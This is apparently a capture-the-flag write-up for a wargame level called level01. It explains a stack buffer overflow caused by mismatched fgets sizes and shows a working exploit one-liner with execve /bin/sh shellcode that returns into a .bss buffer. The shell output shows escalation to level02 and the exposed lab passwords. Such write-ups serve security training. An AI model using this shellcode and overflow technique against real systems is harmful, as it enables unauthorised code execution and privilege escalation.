# Level level01

## how to login

username: level01

password: uSq2ehEGT6c9S24zbshexZQBXUGrncxn5sD5QfGL

## Goal

read `.pass` as user `level02`

## Actually doing something

When looking at the code in ida, there is no exec branch, so we must make one ourselves.

First of all, the code just asks for a username, and if valid, a password.

When looking at the code, the correct username is `dat_wil`

But if the password is correct (aka being `admin`), it still prints the `invalid password` text.

The issue is that the code calls `fgets` on two buffers, but with the wrong size for both of them

The first `fgets` calls writes into a static buffer on the `.bss` segment, which can't provide us with code execution by itself, but we can write the payload there.

The second `fgets` call is passed a buffer on the stack of size `64`, but it is provided a size `100`, meaning we can overflow said buffer and write onto the stack. This allows us to overwrite the return address.

We just point it at the payload stored in the `.bss` segment, and voila :D


```bash
cat <(python -c "print 'dat_wil ' + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + 'A' * ( 256 - 8 - 28 ) + 'B' * 79 + '\x48\xa0\x04\x08'") - | ~/level02
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password: 
nope, incorrect password...

id
uid=1001(level01) gid=1001(level01) euid=1002(level02) egid=100(users) groups=1002(level02),100(users),1001(level01)
cat ~level02/.pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```
